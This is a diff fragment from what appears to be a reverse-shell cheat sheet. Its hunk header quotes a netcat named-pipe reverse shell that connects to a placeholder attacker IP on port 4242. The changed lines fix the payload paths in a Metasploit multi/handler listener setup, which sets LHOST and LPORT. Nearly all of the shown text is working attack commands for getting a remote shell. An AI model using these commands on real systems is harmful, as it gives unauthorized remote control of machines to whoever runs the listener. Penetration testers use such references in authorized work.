@@ -43,9 +43,9 @@ $/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 ```
 msfconsole
 use exploit/multi/handler
-set PAYLOAD /windows/shell/reverse_tcp
+set PAYLOAD windows/shell/reverse_tcp
 OR
-set PAYLOAD /linux/x64/shell/reverse_tcp
+set PAYLOAD linux/x64/shell/reverse_tcp
 set LHOST 192.168.0.1
 set LPORT 4242
 run
